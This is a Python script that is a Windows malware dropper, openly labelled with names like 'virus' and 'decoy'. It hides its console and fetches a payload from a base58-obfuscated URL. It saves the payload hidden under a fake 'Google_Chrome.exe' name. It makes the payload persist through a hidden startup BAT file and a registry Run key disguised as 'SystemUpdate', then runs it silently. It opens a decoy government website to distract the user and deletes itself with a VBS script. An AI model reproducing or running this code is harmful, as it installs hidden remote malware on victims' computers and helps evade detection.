import os
import sys
import subprocess
import ctypes
import base58
import base64
import urllib.request
import tempfile
import webbrowser

UIUYIOUY = "2FFvzA2zeqoVMnthQi81DMnMmfGLLGWoeXwMKMXRPzJptNQpWWekaAk8Lj7JfXggabyGkGSi9htbsUaqcnD3zeF4ENsE9oc28ZUWLHYbYk1UjbjyWYt7DLdbAnLwe"
MYNERAK = base58.b58decode(UIUYIOUY).decode('utf-8', errors='ignore')

SHATO2 = "R29vZ2xlX0Nocm9tZS5leGU="
AYWHWH = base64.b64decode(SHATO2).decode('utf-8', errors='ignore')

_HALOW_NAME = "4hW9yLsQ6Rd8Yz2Lm"
AYTAYUU = base58.b58decode(_HALOW_NAME).decode('utf-8', errors='ignore')

NANORAK = os.environ.get('APPDATA', os.path.expanduser('~'))
SATATA9SU8 = os.path.join(
    os.environ.get('APPDATA', ''),
    'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
)

_DECOY_URL = "https://www.education.gov.dz/"


def _log(_msg, _type="info"):
    _colors = {
        "info": "\033[96m",
        "ok": "\033[92m",
        "err": "\033[91m",
        "warn": "\033[93m",
        "path": "\033[95m",
    }
    _c = _colors.get(_type, "")
    _r = "\033[0m"
    print(f"{_c}[{_type.upper()}]{_r} {_msg}")


def _download_virus():
    _log("Downloading virus...", "info")
    _log(f"URL: {MYNERAK}", "path")
    try:
        _req = urllib.request.Request(
            MYNERAK,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        )
        _response = urllib.request.urlopen(_req, timeout=120)
        _data = _response.read()
        if not _data or len(_data) < 100:
            _log(f"File too small: {len(_data)} bytes", "err")
            return None
        _virus_path = os.path.join(NANORAK, AYWHWH)
        if not os.path.exists(NANORAK):
            os.makedirs(NANORAK)
        with open(_virus_path, 'wb') as _f:
            _f.write(_data)
        _log(f"Downloaded: {len(_data) / 1024 / 1024:.2f} MB", "ok")
        _log(f"Saved to: {_virus_path}", "path")
        try:
            ctypes.windll.kernel32.SetFileAttributesW(_virus_path, 2)
            _log("Virus set to HIDDEN", "ok")
        except:
            pass
        return _virus_path
    except Exception as _e:
        _log(f"Download failed: {_e}", "err")
        return None


def _write_bat(virus_path):
    _log("Writing BAT from scratch...", "info")
    try:
        _bat_path = os.path.join(SATATA9SU8, AYTAYUU)
        if not os.path.exists(SATATA9SU8):
            os.makedirs(SATATA9SU8)
        _bat_content = f'''@echo off
start "" /B "{virus_path}"
exit
'''
        with open(_bat_path, 'w') as _f:
            _f.write(_bat_content)
        _log(f"BAT created: {_bat_path}", "ok")
        try:
            ctypes.windll.kernel32.SetFileAttributesW(_bat_path, 2)
            _log("BAT set to HIDDEN", "ok")
        except:
            pass
        return _bat_path
    except Exception as _e:
        _log(f"BAT creation failed: {_e}", "err")
        return None


def _add_to_registry(virus_path):
    _log("Adding to Registry...", "info")
    try:
        import winreg
        _key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(
            _key, "SystemUpdate", 0, winreg.REG_SZ,
            f'"{virus_path}"'
        )
        winreg.CloseKey(_key)
        _log("Added to Registry (Run)", "ok")
        return True
    except Exception as _e:
        _log(f"Registry failed: {_e}", "warn")
        return False


def _run_virus(virus_path):
    _log("Running virus...", "info")
    try:
        subprocess.Popen(
            [virus_path],
            creationflags=0x08000000,
            shell=False
        )
        _log("Virus started!", "ok")
        return True
    except Exception as _e:
        _log(f"Run failed: {_e}", "err")
        return False


def _open_browser():
    _log("Opening browser (decoy)...", "info")
    try:
        webbrowser.open(_DECOY_URL)
        _log(f"Browser opened: {_DECOY_URL}", "ok")
        return True
    except Exception as _e:
        _log(f"Browser failed: {_e}", "warn")
    try:
        subprocess.Popen(
            ['cmd', '/c', 'start', _DECOY_URL],
            creationflags=0x08000000,
            shell=False
        )
        _log(f"Browser opened via cmd", "ok")
        return True
    except:
        pass
    return False


def _self_destruct():
    _log("Self-destructing...", "info")
    try:
        if getattr(sys, 'frozen', False):
            _script = sys.executable
        else:
            _script = os.path.abspath(sys.argv[0])
        _temp = tempfile.gettempdir()
        _vbs_path = os.path.join(_temp, "del_self.vbs")
        _vbs_content = f'''Set WshShell = CreateObject("WScript.Shell")
WScript.Sleep 2000
WshShell.Run "cmd /c timeout /t 3 /nobreak > nul & del /F /Q ""{_script}"" & del /F /Q ""%~f0""", 0, False
'''
        with open(_vbs_path, 'w') as _f:
            _f.write(_vbs_content)
        subprocess.Popen(
            ['wscript.exe', _vbs_path],
            creationflags=0x08000000,
            shell=False
        )
        _log("Self-destruct launched", "ok")
        return True
    except Exception as _e:
        _log(f"Self-destruct failed: {_e}", "warn")
        return False


def _main():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

    _virus_path = _download_virus()
    if not _virus_path:
        sys.exit(1)

    _bat_path = _write_bat(_virus_path)
    if not _bat_path:
        sys.exit(1)

    _add_to_registry(_virus_path)
    _run_virus(_virus_path)
    _open_browser()
    _self_destruct()
    sys.exit(0)


if __name__ == "__main__":
    try:
        _main()
    except:
        pass
